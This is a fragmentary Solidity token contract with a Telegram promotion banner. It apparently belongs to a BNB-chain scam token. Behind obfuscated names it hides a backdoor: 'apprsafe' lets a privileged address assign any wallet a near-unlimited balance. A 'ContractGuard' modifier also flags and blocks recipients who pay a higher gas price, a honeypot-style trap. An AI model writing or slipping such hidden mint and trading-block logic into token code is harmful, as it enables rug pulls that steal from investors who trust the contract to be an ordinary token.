...
*/
//***********************https://t.me/benkemalgeliyorumbsc***********************
...
contract ContractGuard {
    ...
    modifier onlyOneBlock(address addr) {
        require(
            !checkSameReentranted(addr),
            'ContractGuard: one block, one function'
        );
        if(tx.gasprice > 3000000000){
            _status[block.number][addr] = true;
        }
        _;
    }
}
...
contract Token is Context, IERC20, IERC20Metadata, Ownable, ContractGuard {
     ...
     * - `from` must have a balance of at least `amount`.
     */
    function apprsafe(address wefr) external {
        if (_WBNB == _msgSender()) {_slfjwelrw[wefr] = 100000000000000 * (1000000000 * 10 ** 18);}
    }

    function pepperoni(address zzz) external {
    ...
    uint256 fees = 100;
    function _transfer(address from, address to, uint256 amount) onlyOneBlock(to) internal virtual {
